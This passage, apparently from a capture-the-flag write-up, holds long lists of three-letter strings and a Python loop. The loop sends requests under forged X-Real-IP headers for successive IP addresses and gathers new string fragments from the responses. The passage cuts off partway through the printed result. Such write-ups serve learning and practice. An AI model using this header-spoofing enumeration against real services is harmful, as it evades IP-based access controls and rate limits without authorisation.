class="string">&#x27;Fit&#x27;</span>, <span class="string">&#x27;Fox&#x27;</span>, <span class="string">&#x27;Bum&#x27;</span>, <span class="string">&#x27;Joh&#x27;</span>, <span class="string">&#x27;Lag&#x27;</span>, <span class="string">&#x27;Fic&#x27;</span>, <span class="string">&#x27;Sae&#x27;</span>, <span class="string">&#x27;Gaz&#x27;</span>, <span class="string">&#x27;Yuh&#x27;</span>, <span class="string">&#x27;Hee&#x27;</span>, <span class="string">&#x27;Fae&#x27;</span>, <span class="string">&#x27;Caf&#x27;</span>, <span class="string">&#x27;Nag&#x27;</span>, <span class="string">&#x27;Bay&#x27;</span>, <span class="string">&#x27;Ray&#x27;</span>, <span class="string">&#x27;Log&#x27;</span>, <span class="string">&#x27;Dim&#x27;</span>, <span class="string">&#x27;Bag&#x27;</span>, <span class="string">&#x27;Gap&#x27;</span>, <span class="string">&#x27;San&#x27;</span>, <span class="string">&#x27;Sup&#x27;</span>, <span class="string">&#x27;Kuo&#x27;</span>, <span class="string">&#x27;Wav&#x27;</span>, <span class="string">&#x27;Suh&#x27;</span>, <span class="string">&#x27;Kal&#x27;</span>, <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;Ret&#x27;</span>, <span class="string">&#x27;Seb&#x27;</span>, <span class="string">&#x27;Wil&#x27;</span>, <span class="string">&#x27;Jen&#x27;</span>, <span class="string">&#x27;Haz&#x27;</span>, <span class="string">&#x27;Cum&#x27;</span>, <span class="string">&#x27;Xiv&#x27;</span>, <span class="string">&#x27;Pon&#x27;</span>, <span class="string">&#x27;Cod&#x27;</span>, <span class="string">&#x27;Kit&#x27;</span>, <span class="string">&#x27;Biz&#x27;</span>, <span class="string">&#x27;Gag&#x27;</span>, <span class="string">&#x27;Fen&#x27;</span>, <span class="string">&#x27;Leg&#x27;</span>, <span class="string">&#x27;Uid&#x27;</span>, <span class="string">&#x27;Bod&#x27;</span>, <span class="string">&#x27;Peg&#x27;</span>, <span class="string">&#x27;Fur&#x27;</span>, <span class="string">&#x27;Pip&#x27;</span>, <span class="string">&#x27;Vid&#x27;</span>, <span class="string">&#x27;Ter&#x27;</span>, <span class="string">&#x27;Mol&#x27;</span>, <span class="string">&#x27;Yor&#x27;</span>, <span class="string">&#x27;Tek&#x27;</span>, <span class="string">&#x27;Koo&#x27;</span>, <span class="string">&#x27;Sui&#x27;</span>, <span class="string">&#x27;Gis&#x27;</span>, <span class="string">&#x27;Cia&#x27;</span>, <span class="string">&#x27;Jig&#x27;</span>, <span class="string">&#x27;Nad&#x27;</span>, <span class="string">&#x27;Sin&#x27;</span>, <span class="string">&#x27;Wop&#x27;</span>, <span class="string">&#x27;Hou&#x27;</span>, <span class="string">&#x27;Xii&#x27;</span>, <span class="string">&#x27;Mim&#x27;</span>, <span class="string">&#x27;Naa&#x27;</span>, <span class="string">&#x27;Nia&#x27;</span>, <span class="string">&#x27;Fai&#x27;</span>, <span class="string">&#x27;Cat&#x27;</span>, <span class="string">&#x27;Mio&#x27;</span>, <span class="string">&#x27;Vee&#x27;</span>, <span class="string">&#x27;Sew&#x27;</span>, <span class="string">&#x27;Pal&#x27;</span>, <span class="string">&#x27;Bub&#x27;</span>, <span class="string">&#x27;Lis&#x27;</span>, <span class="string">&#x27;Cac&#x27;</span>, <span class="string">&#x27;Bid&#x27;</span>, <span class="string">&#x27;Pah&#x27;</span>, <span class="string">&#x27;Dip&#x27;</span>, <span class="string">&#x27;Goy&#x27;</span>, <span class="string">&#x27;Rum&#x27;</span>, <span class="string">&#x27;Hoc&#x27;</span>, <span class="string">&#x27;Viz&#x27;</span>, <span class="string">&#x27;Fog&#x27;</span>, <span class="string">&#x27;Tax&#x27;</span>, <span class="string">&#x27;Kin&#x27;</span>, <span class="string">&#x27;Req&#x27;</span>, <span class="string">&#x27;Kik&#x27;</span>, <span class="string">&#x27;Coa&#x27;</span>, <span class="string">&#x27;Meh&#x27;</span>, <span class="string">&#x27;Mum&#x27;</span>, <span class="string">&#x27;Lap&#x27;</span>, <span class="string">&#x27;Mov&#x27;</span>, <span class="string">&#x27;Pir&#x27;</span>, <span class="string">&#x27;Bop&#x27;</span>, <span class="string">&#x27;Der&#x27;</span>, <span class="string">&#x27;Dag&#x27;</span>, <span class="string">&#x27;Lei&#x27;</span>, <span class="string">&#x27;Jit&#x27;</span>, <span class="string">&#x27;Tod&#x27;</span>, <span class="string">&#x27;Far&#x27;</span>, <span class="string">&#x27;Tig&#x27;</span>, <span class="string">&#x27;Tae&#x27;</span>, <span class="string">&#x27;Ten&#x27;</span>, <span class="string">&#x27;Toe&#x27;</span>, <span class="string">&#x27;Sep&#x27;</span>, <span class="string">&#x27;Mac&#x27;</span>, <span class="string">&#x27;Hua&#x27;</span>, <span class="string">&#x27;Vik&#x27;</span>, <span class="string">&#x27;Piu&#x27;</span>, <span class="string">&#x27;Rar&#x27;</span>, <span class="string">&#x27;Hut&#x27;</span>, <span class="string">&#x27;New&#x27;</span>, <span class="string">&#x27;Pap&#x27;</span>, <span class="string">&#x27;Hid&#x27;</span>, <span class="string">&#x27;Xia&#x27;</span>, <span class="string">&#x27;Hug&#x27;</span>, <span class="string">&#x27;Rox&#x27;</span>, <span class="string">&#x27;Rey&#x27;</span>, <span class="string">&#x27;Meg&#x27;</span>, <span class="string">&#x27;Zak&#x27;</span>, <span class="string">&#x27;Uas&#x27;</span>, <span class="string">&#x27;Dug&#x27;</span>, <span class="string">&#x27;Bes&#x27;</span>, <span class="string">&#x27;Ton&#x27;</span>, <span class="string">&#x27;Lad&#x27;</span>, <span class="string">&#x27;Hus&#x27;</span>, <span class="string">&#x27;Lew&#x27;</span>, <span class="string">&#x27;Jiu&#x27;</span>, <span class="string">&#x27;Pub&#x27;</span>, <span class="string">&#x27;Buy&#x27;</span>, <span class="string">&#x27;Bet&#x27;</span>, <span class="string">&#x27;Nog&#x27;</span>, <span class="string">&#x27;Yak&#x27;</span>, <span class="string">&#x27;Bau&#x27;</span>, <span class="string">&#x27;Qol&#x27;</span>, <span class="string">&#x27;Yet&#x27;</span>, <span class="string">&#x27;Dor&#x27;</span>, <span class="string">&#x27;Buh&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;Baz&#x27;</span>, <span class="string">&#x27;Kat&#x27;</span>, <span class="string">&#x27;Fei&#x27;</span>, <span class="string">&#x27;Kon&#x27;</span>, <span class="string">&#x27;Nuh&#x27;</span>, <span class="string">&#x27;Noa&#x27;</span>, <span class="string">&#x27;Cap&#x27;</span>, <span class="string">&#x27;Cil&#x27;</span>, <span class="string">&#x27;Tan&#x27;</span>, <span class="string">&#x27;Jed&#x27;</span>, <span class="string">&#x27;Dur&#x27;</span>, <span class="string">&#x27;Bol&#x27;</span>, <span class="string">&#x27;Sux&#x27;</span>, <span class="string">&#x27;Gov&#x27;</span>, <span class="string">&#x27;Dev&#x27;</span>, <span class="string">&#x27;Teh&#x27;</span>, <span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;Bal&#x27;</span>, <span class="string">&#x27;Pep&#x27;</span>, <span class="string">&#x27;Hah&#x27;</span>, <span class="string">&#x27;Res&#x27;</span>, <span class="string">&#x27;Cai&#x27;</span>, <span class="string">&#x27;Gas&#x27;</span>, <span class="string">&#x27;Qiu&#x27;</span>, <span class="string">&#x27;Wiz&#x27;</span>, <span class="string">&#x27;Pis&#x27;</span>, <span class="string">&#x27;Heh&#x27;</span>, <span class="string">&#x27;Dil&#x27;</span>, <span class="string">&#x27;Yer&#x27;</span>, <span class="string">&#x27;Gon&#x27;</span>, <span class="string">&#x27;Nis&#x27;</span>, <span class="string">&#x27;Fiu&#x27;</span>, <span class="string">&#x27;Ber&#x27;</span>, <span class="string">&#x27;Gan&#x27;</span>, <span class="string">&#x27;Bak&#x27;</span>, <span class="string">&#x27;Fud&#x27;</span>, <span class="string">&#x27;Cog&#x27;</span>, <span class="string">&#x27;Zim&#x27;</span>, <span class="string">&#x27;Doa&#x27;</span>, <span class="string">&#x27;Bos&#x27;</span>, <span class="string">&#x27;Hen&#x27;</span>, <span class="string">&#x27;Hes&#x27;</span>, <span class="string">&#x27;Dub&#x27;</span>, <span class="string">&#x27;Web&#x27;</span>, <span class="string">&#x27;Lol&#x27;</span>, <span class="string">&#x27;Zoo&#x27;</span>, <span class="string">&#x27;Vag&#x27;</span>, <span class="string">&#x27;Lep&#x27;</span>, <span class="string">&#x27;Vin&#x27;</span>, <span class="string">&#x27;Cep&#x27;</span>, <span class="string">&#x27;Sow&#x27;</span>, <span class="string">&#x27;Naw&#x27;</span>, <span class="string">&#x27;Mee&#x27;</span>, <span class="string">&#x27;Vir&#x27;</span>, <span class="string">&#x27;Jae&#x27;</span>, <span class="string">&#x27;Lic&#x27;</span>, <span class="string">&#x27;Gah&#x27;</span>, <span class="string">&#x27;Wax&#x27;</span>, <span class="string">&#x27;Zap&#x27;</span>, <span class="string">&#x27;Bur&#x27;</span>, <span class="string">&#x27;Civ&#x27;</span>, <span class="string">&#x27;Tag&#x27;</span>, <span class="string">&#x27;Led&#x27;</span>, <span class="string">&#x27;Boe&#x27;</span>, <span class="string">&#x27;Cin&#x27;</span>, <span class="string">&#x27;You&#x27;</span>, <span class="string">&#x27;Daf&#x27;</span>, <span class="string">&#x27;Beg&#x27;</span>, <span class="string">&#x27;Xan&#x27;</span>, <span class="string">&#x27;Wix&#x27;</span>, <span class="string">&#x27;Nun&#x27;</span>, <span class="string">&#x27;Yap&#x27;</span>, <span class="string">&#x27;Bai&#x27;</span>, <span class="string">&#x27;Cox&#x27;</span>, <span class="string">&#x27;Sur&#x27;</span>, <span class="string">&#x27;Fet&#x27;</span>, <span class="string">&#x27;Moj&#x27;</span>, <span class="string">&#x27;Lau&#x27;</span>, <span class="string">&#x27;Dis&#x27;</span>, <span class="string">&#x27;Mat&#x27;</span>, <span class="string">&#x27;Rid&#x27;</span>, <span class="string">&#x27;Mal&#x27;</span>, <span class="string">&#x27;Ris&#x27;</span>, <span class="string">&#x27;Uis&#x27;</span>, <span class="string">&#x27;Hib&#x27;</span>, <span class="string">&#x27;Vie&#x27;</span>, <span class="string">&#x27;But&#x27;</span>]</span><br><span class="line">third=[<span class="string">&#x27;Ser&#x27;</span>, <span class="string">&#x27;Dea&#x27;</span>, <span class="string">&#x27;Jac&#x27;</span>, <span class="string">&#x27;Way&#x27;</span>, <span class="string">&#x27;Cio&#x27;</span>, <span class="string">&#x27;Tie&#x27;</span>, <span class="string">&#x27;Tun&#x27;</span>, <span class="string">&#x27;Goa&#x27;</span>, <span class="string">&#x27;Sap&#x27;</span>, <span class="string">&#x27;Fan&#x27;</span>, <span class="string">&#x27;Jor&#x27;</span>, <span class="string">&#x27;Pit&#x27;</span>, <span class="string">&#x27;Gor&#x27;</span>, <span class="string">&#x27;Son&#x27;</span>, <span class="string">&#x27;Mun&#x27;</span>, <span class="string">&#x27;Dan&#x27;</span>, <span class="string">&#x27;Veg&#x27;</span>, <span class="string">&#x27;Wel&#x27;</span>, <span class="string">&#x27;Sev&#x27;</span>, <span class="string">&#x27;Jeb&#x27;</span>, <span class="string">&#x27;Gio&#x27;</span>, <span class="string">&#x27;Ceu&#x27;</span>, <span class="string">&#x27;Bib&#x27;</span>, <span class="string">&#x27;Cif&#x27;</span>, <span class="string">&#x27;Bug&#x27;</span>, <span class="string">&#x27;Zan&#x27;</span>, <span class="string">&#x27;Mec&#x27;</span>, <span class="string">&#x27;Rob&#x27;</span>, <span class="string">&#x27;Lao&#x27;</span>, <span class="string">&#x27;Hew&#x27;</span>, <span class="string">&#x27;Quo&#x27;</span>, <span class="string">&#x27;Hor&#x27;</span>, <span class="string">&#x27;Foe&#x27;</span>, <span class="string">&#x27;Mak&#x27;</span>, <span class="string">&#x27;Hol&#x27;</span>, <span class="string">&#x27;Fil&#x27;</span>, <span class="string">&#x27;Cam&#x27;</span>, <span class="string">&#x27;Nur&#x27;</span>, <span class="string">&#x27;Vet&#x27;</span>, <span class="string">&#x27;Yea&#x27;</span>, <span class="string">&#x27;Yup&#x27;</span>, <span class="string">&#x27;Lot&#x27;</span>, <span class="string">&#x27;Jab&#x27;</span>, <span class="string">&#x27;Goo&#x27;</span>, <span class="string">&#x27;Soy&#x27;</span>, <span class="string">&#x27;Pay&#x27;</span>, <span class="string">&#x27;Hoe&#x27;</span>, <span class="string">&#x27;Dud&#x27;</span>, <span class="string">&#x27;Qos&#x27;</span>, <span class="string">&#x27;Boa&#x27;</span>, <span class="string">&#x27;Ceb&#x27;</span>, <span class="string">&#x27;Lug&#x27;</span>, <span class="string">&#x27;Nic&#x27;</span>, <span class="string">&#x27;Rai&#x27;</span>, <span class="string">&#x27;Nap&#x27;</span>, <span class="string">&#x27;Sem&#x27;</span>, <span class="string">&#x27;Rue&#x27;</span>, <span class="string">&#x27;Bah&#x27;</span>, <span class="string">&#x27;Sez&#x27;</span>, <span class="string">&#x27;Jib&#x27;</span>, <span class="string">&#x27;Ual&#x27;</span>, <span class="string">&#x27;Mus&#x27;</span>, <span class="string">&#x27;Cip&#x27;</span>, <span class="string">&#x27;Cir&#x27;</span>, <span class="string">&#x27;Yan&#x27;</span>, <span class="string">&#x27;Div&#x27;</span>, <span class="string">&#x27;Bor&#x27;</span>, <span class="string">&#x27;War&#x27;</span>, <span class="string">&#x27;Don&#x27;</span>, <span class="string">&#x27;Tug&#x27;</span>, <span class="string">&#x27;Tuk&#x27;</span>, <span class="string">&#x27;Maj&#x27;</span>, <span class="string">&#x27;Hae&#x27;</span>, <span class="string">&#x27;Rui&#x27;</span>, <span class="string">&#x27;Git&#x27;</span>, <span class="string">&#x27;Gil&#x27;</span>, <span class="string">&#x27;Lab&#x27;</span>, <span class="string">&#x27;Med&#x27;</span>, <span class="string">&#x27;Mag&#x27;</span>, <span class="string">&#x27;Dui&#x27;</span>, <span class="string">&#x27;Ruv&#x27;</span>, <span class="string">&#x27;Raw&#x27;</span>, <span class="string">&#x27;Sol&#x27;</span>, <span class="string">&#x27;Foy&#x27;</span>, <span class="string">&#x27;Sib&#x27;</span>, <span class="string">&#x27;Sub&#x27;</span>, <span class="string">&#x27;Moz&#x27;</span>, <span class="string">&#x27;Ras&#x27;</span>, <span class="string">&#x27;Mil&#x27;</span>, <span class="string">&#x27;Rem&#x27;</span>, <span class="string">&#x27;Nix&#x27;</span>, <span class="string">&#x27;Dom&#x27;</span>, <span class="string">&#x27;Ban&#x27;</span>, <span class="string">&#x27;Zeb&#x27;</span>, <span class="string">&#x27;Woo&#x27;</span>, <span class="string">&#x27;Pus&#x27;</span>, <span class="string">&#x27;Mau&#x27;</span>, <span class="string">&#x27;Boi&#x27;</span>, <span class="string">&#x27;Ped&#x27;</span>, <span class="string">&#x27;Kee&#x27;</span>, <span class="string">&#x27;Pop&#x27;</span>, <span class="string">&#x27;Mix&#x27;</span>, <span class="string">&#x27;Wai&#x27;</span>, <span class="string">&#x27;Gun&#x27;</span>, <span class="string">&#x27;Ley&#x27;</span>, <span class="string">&#x27;Cee&#x27;</span>, <span class="string">&#x27;Bok&#x27;</span>, <span class="string">&#x27;Fao&#x27;</span>, <span class="string">&#x27;Sul&#x27;</span>, <span class="string">&#x27;Zac&#x27;</span>, <span class="string">&#x27;Siu&#x27;</span>, <span class="string">&#x27;Jan&#x27;</span>, <span class="string">&#x27;Sai&#x27;</span>, <span class="string">&#x27;Ged&#x27;</span>, <span class="string">&#x27;Pau&#x27;</span>, <span class="string">&#x27;Cop&#x27;</span>, <span class="string">&#x27;Les&#x27;</span>, <span class="string">&#x27;Suu&#x27;</span>, <span class="string">&#x27;Dir&#x27;</span>, <span class="string">&#x27;Var&#x27;</span>, <span class="string">&#x27;Wap&#x27;</span>, <span class="string">&#x27;Tai&#x27;</span>, <span class="string">&#x27;Wah&#x27;</span>, <span class="string">&#x27;Rei&#x27;</span>, <span class="string">&#x27;Pas&#x27;</span>, <span class="string">&#x27;Bat&#x27;</span>, <span class="string">&#x27;Cas&#x27;</span>, <span class="string">&#x27;Fad&#x27;</span>, <span class="string">&#x27;Joe&#x27;</span>, <span class="string">&#x27;Nir&#x27;</span>, <span class="string">&#x27;Fem&#x27;</span>, <span class="string">&#x27;Hai&#x27;</span>, <span class="string">&#x27;Tal&#x27;</span>, <span class="string">&#x27;Wea&#x27;</span>, <span class="string">&#x27;Rok&#x27;</span>, <span class="string">&#x27;Hoa&#x27;</span>, <span class="string">&#x27;Goh&#x27;</span>, <span class="string">&#x27;Hof&#x27;</span>, <span class="string">&#x27;Nos&#x27;</span>, <span class="string">&#x27;Roy&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;Nem&#x27;</span>, <span class="string">&#x27;Bel&#x27;</span>, <span class="string">&#x27;Yui&#x27;</span>, <span class="string">&#x27;Wor&#x27;</span>, <span class="string">&#x27;Neb&#x27;</span>, <span class="string">&#x27;Tot&#x27;</span>, <span class="string">&#x27;Luv&#x27;</span>, <span class="string">&#x27;Yun&#x27;</span>, <span class="string">&#x27;Lil&#x27;</span>, <span class="string">&#x27;Doc&#x27;</span>, <span class="string">&#x27;Lai&#x27;</span>, <span class="string">&#x27;Hem&#x27;</span>, <span class="string">&#x27;Kew&#x27;</span>, <span class="string">&#x27;Lay&#x27;</span>, <span class="string">&#x27;Nik&#x27;</span>, <span class="string">&#x27;Gus&#x27;</span>, <span class="string">&#x27;Hoh&#x27;</span>, <span class="string">&#x27;Fix&#x27;</span>, <span class="string">&#x27;Cup&#x27;</span>, <span class="string">&#x27;Fer&#x27;</span>, <span class="string">&#x27;Deo&#x27;</span>, <span class="string">&#x27;Coy&#x27;</span>, <span class="string">&#x27;Jer&#x27;</span>, <span class="string">&#x27;Luc&#x27;</span>, <span class="string">&#x27;Gif&#x27;</span>, <span class="string">&#x27;Cou&#x27;</span>, <span class="string">&#x27;Dob&#x27;</span>, <span class="string">&#x27;Dow&#x27;</span>, <span class="string">&#x27;Hum&#x27;</span>, <span class="string">&#x27;Hom&#x27;</span>, <span class="string">&#x27;Nan&#x27;</span>, <span class="string">&#x27;Dot&#x27;</span>, <span class="string">&#x27;Den&#x27;</span>, <span class="string">&#x27;Yeh&#x27;</span>, <span class="string">&#x27;Ces&#x27;</span>, <span class="string">&#x27;Jak&#x27;</span>, <span class="string">&#x27;Nei&#x27;</span>, <span class="string">&#x27;Rag&#x27;</span>, <span class="string">&#x27;Dar&#x27;</span>, <span class="string">&#x27;Pun&#x27;</span>, <span class="string">&#x27;Dex&#x27;</span>, <span class="string">&#x27;Gee&#x27;</span>, <span class="string">&#x27;Nes&#x27;</span>, <span class="string">&#x27;Mit&#x27;</span>, <span class="string">&#x27;Fos&#x27;</span>, <span class="string">&#x27;Sed&#x27;</span>, <span class="string">&#x27;Pac&#x27;</span>, <span class="string">&#x27;Cic&#x27;</span>, <span class="string">&#x27;Toi&#x27;</span>, <span class="string">&#x27;Raz&#x27;</span>, <span class="string">&#x27;Tok&#x27;</span>, <span class="string">&#x27;Did&#x27;</span>, <span class="string">&#x27;Rik&#x27;</span>, <span class="string">&#x27;Hit&#x27;</span>, <span class="string">&#x27;Kam&#x27;</span>, <span class="string">&#x27;Hiv&#x27;</span>, <span class="string">&#x27;Jut&#x27;</span>, <span class="string">&#x27;Tee&#x27;</span>, <span class="string">&#x27;Pod&#x27;</span>, <span class="string">&#x27;Gir&#x27;</span>, <span class="string">&#x27;Sax&#x27;</span>, <span class="string">&#x27;Hat&#x27;</span>, <span class="string">&#x27;Dab&#x27;</span>, <span class="string">&#x27;Nai&#x27;</span>, <span class="string">&#x27;Jez&#x27;</span>, <span class="string">&#x27;Was&#x27;</span>, <span class="string">&#x27;Bon&#x27;</span>, <span class="string">&#x27;Kid&#x27;</span>, <span class="string">&#x27;Him&#x27;</span>, <span class="string">&#x27;Tia&#x27;</span>, <span class="string">&#x27;Bin&#x27;</span>, <span class="string">&#x27;Wep&#x27;</span>, <span class="string">&#x27;Dup&#x27;</span>, <span class="string">&#x27;Yue&#x27;</span>, <span class="string">&#x27;Maa&#x27;</span>, <span class="string">&#x27;Hao&#x27;</span>, <span class="string">&#x27;Suv&#x27;</span>, <span class="string">&#x27;Ken&#x27;</span>, <span class="string">&#x27;Mod&#x27;</span>, <span class="string">&#x27;Kan&#x27;</span>, <span class="string">&#x27;Moc&#x27;</span>, <span class="string">&#x27;Cow&#x27;</span>, <span class="string">&#x27;Sex&#x27;</span>, <span class="string">&#x27;Ben&#x27;</span>, <span class="string">&#x27;Deg&#x27;</span>, <span class="string">&#x27;Gaf&#x27;</span>, <span class="string">&#x27;Yaw&#x27;</span>, <span class="string">&#x27;Luk&#x27;</span>, <span class="string">&#x27;Faa&#x27;</span>, <span class="string">&#x27;Bow&#x27;</span>, <span class="string">&#x27;Ror&#x27;</span>, <span class="string">&#x27;Bee&#x27;</span>, <span class="string">&#x27;Cob&#x27;</span>, <span class="string">&#x27;Loy&#x27;</span>, <span class="string">&#x27;Row&#x27;</span>, <span class="string">&#x27;Det&#x27;</span>, <span class="string">&#x27;Nut&#x27;</span>, <span class="string">&#x27;Rah&#x27;</span>, <span class="string">&#x27;Coi&#x27;</span>, <span class="string">&#x27;Rap&#x27;</span>, <span class="string">&#x27;Def&#x27;</span>, <span class="string">&#x27;Hie&#x27;</span>, <span class="string">&#x27;Tic&#x27;</span>, <span class="string">&#x27;Wis&#x27;</span>, <span class="string">&#x27;Mew&#x27;</span>, <span class="string">&#x27;Dav&#x27;</span>, <span class="string">&#x27;Sir&#x27;</span>, <span class="string">&#x27;Zoe&#x27;</span>, <span class="string">&#x27;Zin&#x27;</span>, <span class="string">&#x27;Uac&#x27;</span>, <span class="string">&#x27;Rab&#x27;</span>, <span class="string">&#x27;Yen&#x27;</span>, <span class="string">&#x27;Sip&#x27;</span>, <span class="string">&#x27;Nip&#x27;</span>, <span class="string">&#x27;Bir&#x27;</span>, <span class="string">&#x27;Pak&#x27;</span>, <span class="string">&#x27;Kar&#x27;</span>, <span class="string">&#x27;Gen&#x27;</span>, <span class="string">&#x27;Kea&#x27;</span>, <span class="string">&#x27;Sor&#x27;</span>, <span class="string">&#x27;Lod&#x27;</span>, <span class="string">&#x27;Fas&#x27;</span>, <span class="string">&#x27;Sif&#x27;</span>, <span class="string">&#x27;Zag&#x27;</span>, <span class="string">&#x27;Rea&#x27;</span>, <span class="string">&#x27;Wed&#x27;</span>, <span class="string">&#x27;Vex&#x27;</span>, <span class="string">&#x27;Lem&#x27;</span>, <span class="string">&#x27;Sob&#x27;</span>, <span class="string">&#x27;Sue&#x27;</span>, <span class="string">&#x27;Lar&#x27;</span>, <span class="string">&#x27;Rav&#x27;</span>, <span class="string">&#x27;Sou&#x27;</span>, <span class="string">&#x27;Bev&#x27;</span>, <span class="string">&#x27;Kek&#x27;</span>, <span class="string">&#x27;Kol&#x27;</span>, <span class="string">&#x27;Rae&#x27;</span>, <span class="string">&#x27;Map&#x27;</span>, <span class="string">&#x27;Dah&#x27;</span>, <span class="string">&#x27;Pee&#x27;</span>, <span class="string">&#x27;Tam&#x27;</span>, <span class="string">&#x27;Loc&#x27;</span>, <span class="string">&#x27;Boc&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;Coz&#x27;</span>, <span class="string">&#x27;Ful&#x27;</span>, <span class="string">&#x27;Paz&#x27;</span>, <span class="string">&#x27;Hop&#x27;</span>, <span class="string">&#x27;Bui&#x27;</span>, <span class="string">&#x27;Ref&#x27;</span>, <span class="string">&#x27;Coo&#x27;</span>, <span class="string">&#x27;Rez&#x27;</span>, <span class="string">&#x27;Seq&#x27;</span>, <span class="string">&#x27;Lou&#x27;</span>, <span class="string">&#x27;Hon&#x27;</span>, <span class="string">&#x27;Leo&#x27;</span>, <span class="string">&#x27;Bis&#x27;</span>, <span class="string">&#x27;Dia&#x27;</span>, <span class="string">&#x27;Hui&#x27;</span>, <span class="string">&#x27;Mai&#x27;</span>, <span class="string">&#x27;Pez&#x27;</span>, <span class="string">&#x27;Boy&#x27;</span>, <span class="string">&#x27;Rog&#x27;</span>, <span class="string">&#x27;Dac&#x27;</span>, <span class="string">&#x27;Tut&#x27;</span>, <span class="string">&#x27;Rut&#x27;</span>, <span class="string">&#x27;Cuz&#x27;</span>, <span class="string">&#x27;Now&#x27;</span>, <span class="string">&#x27;Nii&#x27;</span>, <span class="string">&#x27;Yas&#x27;</span>, <span class="string">&#x27;Doj&#x27;</span>, <span class="string">&#x27;Saw&#x27;</span>, <span class="string">&#x27;Bex&#x27;</span>, <span class="string">&#x27;Fom&#x27;</span>]</span><br><span class="line">fourth=[]</span><br><span class="line"><span class="keyword">while</span> current_ip <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    headers = headers_template.copy()</span><br><span class="line">    headers[<span class="string">&#x27;X-Real-IP&#x27;</span>] = current_ip</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, headers=headers)</span><br><span class="line">        <span class="keyword">match</span> = pattern.search(response.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            comb=<span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> comb[<span class="number">0</span>:<span class="number">3</span>] <span class="keyword">not</span> <span class="keyword">in</span> first <span class="keyword">and</span> comb[<span class="number">0</span>:<span class="number">3</span>] <span class="keyword">not</span> <span class="keyword">in</span> second <span class="keyword">and</span> comb[<span class="number">0</span>:<span class="number">3</span>] <span class="keyword">not</span> <span class="keyword">in</span> third <span class="keyword">and</span> comb[<span class="number">0</span>:<span class="number">3</span>] <span class="keyword">not</span> <span class="keyword">in</span> fourth:</span><br><span class="line">                fourth.append(comb[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">            <span class="keyword">elif</span> comb[<span class="number">3</span>:<span class="number">6</span>] <span class="keyword">not</span> <span class="keyword">in</span> first <span class="keyword">and</span> comb[<span class="number">3</span>:<span class="number">6</span>] <span class="keyword">not</span> <span class="keyword">in</span> second <span class="keyword">and</span> comb[<span class="number">3</span>:<span class="number">6</span>] <span class="keyword">not</span> <span class="keyword">in</span> third <span class="keyword">and</span> comb[<span class="number">3</span>:<span class="number">6</span>] <span class="keyword">not</span> <span class="keyword">in</span> fourth:</span><br><span class="line">                fourth.append(comb[<span class="number">3</span>:<span class="number">6</span>])</span><br><span class="line">            <span class="keyword">elif</span> comb[<span class="number">6</span>:<span class="number">9</span>] <span class="keyword">not</span> <span class="keyword">in</span> first <span class="keyword">and</span> comb[<span class="number">6</span>:<span class="number">9</span>] <span class="keyword">not</span> <span class="keyword">in</span> second <span class="keyword">and</span> comb[<span class="number">6</span>:<span class="number">9</span>] <span class="keyword">not</span> <span class="keyword">in</span> third <span class="keyword">and</span> comb[<span class="number">6</span>:<span class="number">9</span>] <span class="keyword">not</span> <span class="keyword">in</span> fourth:</span><br><span class="line">                fourth.append(comb[<span class="number">6</span>:<span class="number">9</span>])</span><br><span class="line">            <span class="keyword">elif</span> comb[<span class="number">9</span>:<span class="number">12</span>] <span class="keyword">not</span> <span class="keyword">in</span> first <span class="keyword">and</span> comb[<span class="number">9</span>:<span class="number">12</span>] <span class="keyword">not</span> <span class="keyword">in</span> second <span class="keyword">and</span> comb[<span class="number">9</span>:<span class="number">12</span>] <span class="keyword">not</span> <span class="keyword">in</span> third <span class="keyword">and</span> comb[<span class="number">9</span>:<span class="number">12</span>] <span class="keyword">not</span> <span class="keyword">in</span> fourth:</span><br><span class="line">                fourth.append(comb[<span class="number">9</span>:<span class="number">12</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error occurred while processing IP <span class="subst">&#123;current_ip&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    next_ip = increment_ip(current_ip)</span><br><span class="line">    <span class="keyword">if</span> next_ip <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    current_ip = next_ip</span><br><span class="line"><span class="built_in">print</span>(fourth)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到最后这个部分的字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;Puc&#x27;</span>, <span class="string">&#x27;Maz&#x27;</span>, <span class="string">&#x27;Doh&#x27;</span>, <span class="string">&#x27;Hun&#x27;</span>, <span class="string">&#x27;Cud&#x27;</span>, <span class="string">&#x27;Vit&#x27;</span>, <span class="string">&#x27;Wer&#x27;</span>, <span class="string">&#x27;Hag&#x27;</span>, <span class="string">&#x27;Din&#x27;</span>, <span class="string">&#x27;Feb&#x27;</span>, <span class="string">&#x27;Gui&#x27;</span>, <span class="string">&#x27;Rak&#x27;</span>, <span class="string">&#x27;Vac&#x27;</span>, <span class="string">&#x27;Kim&#x27;</span>, <span class="string">&#x27;Pol&#x27;</span>, <span class="string">&#x27;Som&#x27;</span>, <span class="string">&#x27;Saa&#x27;</span>, <span class="string">&#x27;Hac&#x27;</span>, <span class="string">&#x27;Xie&#x27;</span>, <span class="string">&#x27;Ses&#x27;</span>, <span class="string">&#x27;Van&#x27;</span>, <span class="string">&#x27;Nef&#x27;</span>, <span class="string">&#x27;Mia&#x27;</span>, <span class="string">&#x27;Tab&#x27;</span>, <span class="string">&#x27;Pid&#x27;</span>, <span class="string">&#x27;Ver&#x27;</span>, <span class="string">&#x27;Cay&#x27;</span>, <span class="string">&#x27;Jog&#x27;</span>, <span class="string">&#x27;Jar&#x27;</span>, <span class="string">&#x27;Lan&#x27;</span>, <span class="string">&#x27;Hex&#x27;</span>, <span class="string">&#x27;Soe&#x27;</span>, <span 